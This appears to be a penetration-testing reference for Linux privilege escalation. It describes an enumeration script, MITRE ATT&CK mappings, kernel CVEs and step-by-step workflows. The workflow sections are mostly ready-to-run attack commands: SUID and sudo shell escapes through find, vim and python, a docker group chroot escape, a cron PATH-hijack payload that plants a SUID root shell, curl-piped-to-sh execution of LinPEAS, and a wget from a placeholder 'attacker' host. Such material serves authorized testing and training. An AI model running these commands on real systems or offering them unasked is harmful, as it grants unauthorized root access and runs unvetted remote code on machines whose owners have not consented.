# Performing Privilege Escalation On Linux

## API Reference

## Libraries Used
- **subprocess**: Execute system enumeration commands (sudo, find, getcap, crontab)
- **os**: Check file writability with os.access()
- **pathlib**: File system navigation
- **re**: Pattern matching for cron script paths

## CLI Interface
```
python agent.py sysinfo
python agent.py sudo
python agent.py suid
python agent.py writable
python agent.py cron
python agent.py caps
python agent.py full
```

## Core Functions

### `enumerate_system_info()` — Kernel, user, architecture info
### `check_sudo_permissions()` — Sudo privilege analysis
Checks `sudo -l` output against 30+ GTFOBins-exploitable binaries.
Detects NOPASSWD entries and full sudo access.

### `find_suid_binaries()` — SUID/SGID binary enumeration
Identifies binaries with SUID bit set. Cross-references GTFOBins database.

### `check_writable_files()` — Sensitive writable file detection
Checks: /etc/passwd, /etc/shadow, /etc/sudoers, /etc/crontab, /root, cron dirs.

### `check_cron_jobs()` — Cron job privilege escalation vectors
Identifies writable scripts called from cron jobs (CRITICAL finding).

### `check_capabilities()` — Linux capability enumeration
Flags: cap_setuid, cap_setgid, cap_sys_admin, cap_dac_override, cap_net_raw.

### `full_enumeration()` — Combined analysis

## GTFOBins SUID Exploitable Binaries (subset)
vim, find, bash, python, perl, nmap, env, tar, docker, strace, gdb, pkexec

## Dangerous Sudo Patterns
| Pattern | Severity | Vector |
|---------|----------|--------|
| (ALL) NOPASSWD: /usr/bin/vim | CRITICAL | Shell escape |
| (ALL : ALL) ALL | CRITICAL | Full root access |
| NOPASSWD: /usr/bin/find | CRITICAL | -exec escalation |

## Dependencies
No external packages — Python standard library only.
System: find, getcap, sudo, crontab

---

## Standards and Controls

## MITRE ATT&CK - Privilege Escalation (TA0004)
| Technique ID | Name | Description |
|-------------|------|-------------|
| T1548.001 | Setuid and Setgid | Exploit SUID/SGID binaries |
| T1548.003 | Sudo and Sudo Caching | Abuse sudo misconfigurations |
| T1068 | Exploitation for Privilege Escalation | Kernel/service exploits |
| T1574.006 | Dynamic Linker Hijacking | LD_PRELOAD/LD_LIBRARY_PATH abuse |
| T1053.003 | Cron | Abuse scheduled tasks |
| T1543.002 | Systemd Service | Writable service manipulation |

## Common Kernel CVEs
| CVE | Name | Kernel Range | CVSS |
|-----|------|-------------|------|
| CVE-2016-5195 | Dirty Cow | < 4.8.3 | 7.8 |
| CVE-2021-4034 | PwnKit (pkexec) | Polkit < 0.120 | 7.8 |
| CVE-2022-0847 | Dirty Pipe | 5.8 - 5.16.10 | 7.8 |
| CVE-2021-3156 | Baron Samedit (sudo) | sudo < 1.9.5p2 | 7.8 |
| CVE-2023-2640 | GameOver(lay) | Ubuntu kernels | 7.8 |
| CVE-2023-0386 | OverlayFS | 5.11 - 6.2 | 7.8 |

## CIS Benchmark - Linux
- Ensure permissions on /etc/crontab are configured (600 root:root)
- Ensure SUID/SGID files are reviewed regularly
- Ensure sudo is configured to use a pseudo-TTY
- Ensure no world-writable files exist in system paths

---

## Workflows

## Workflow 1: Manual Enumeration

### System Information
```bash
# OS and kernel version
uname -a
cat /etc/os-release
cat /proc/version

# Check for writable paths
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null

# Network info
ip a
ss -tlnp
netstat -tulpn
```

### SUID/SGID Binaries
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Cross-reference with GTFOBins
# https://gtfobins.github.io/
```

### Sudo Configuration
```bash
sudo -l
# Check for:
# - (ALL) NOPASSWD: /usr/bin/vim
# - (ALL) NOPASSWD: /usr/bin/find
# - (ALL) NOPASSWD: /usr/bin/python3
# - Wildcard entries: /usr/bin/rsync *
```

### Cron Jobs
```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
# Monitor processes for hidden cron
# Use pspy to see processes running as root
```

### Capabilities
```bash
getcap -r / 2>/dev/null
# Interesting capabilities:
# cap_setuid - python3, perl, ruby
# cap_dac_override - any binary
# cap_net_raw - tcpdump
```

## Workflow 2: Automated Enumeration

### LinPEAS
```bash
# Download and run
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or transfer and run
wget http://attacker/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a 2>&1 | tee linpeas_output.txt
```

### Linux Exploit Suggester
```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

## Workflow 3: Common Exploitation

### SUID Binary Exploitation (GTFOBins)
```bash
# /usr/bin/find with SUID
find . -exec /bin/sh -p \; -quit

# /usr/bin/python3 with SUID
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# /usr/bin/vim with SUID
vim -c ':!sh'

# /usr/bin/nmap with SUID (old versions)
nmap --interactive
!sh
```

### Sudo Abuse Examples
```bash
# sudo vim
sudo vim -c ':!sh'

# sudo find
sudo find / -exec /bin/sh \; -quit

# sudo python3
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'

# sudo env with LD_PRELOAD
# If env_keep+=LD_PRELOAD is set:
# Compile shared object that spawns shell
# sudo LD_PRELOAD=/tmp/exploit.so /usr/bin/any_allowed_command
```

### PwnKit (CVE-2021-4034)
```bash
# Check if vulnerable
pkexec --version
# Vulnerable: polkit < 0.120

# Multiple public exploits available
# Usage: compile and run - instant root
```

### Dirty Pipe (CVE-2022-0847)
```bash
# Check kernel version
uname -r
# Vulnerable: 5.8 <= kernel < 5.16.11, 5.15.25, 5.10.102

# Exploit overwrites read-only files via pipe splice
```

## Workflow 4: Advanced Techniques

### Docker Escape (if user is in docker group)
```bash
# Check group membership
id
# If in docker group:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### NFS Root Squashing Bypass
```bash
# Check NFS exports
showmount -e target
cat /etc/exports
# If no_root_squash is set:
# Mount share, create SUID binary, execute on target
```

### PATH Hijacking in Cron
```bash
# If cron job uses relative paths:
# Create malicious binary in writable PATH directory
echo '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /tmp/command_name
chmod +x /tmp/command_name
# Wait for cron to execute, then:
/tmp/rootbash -p
```
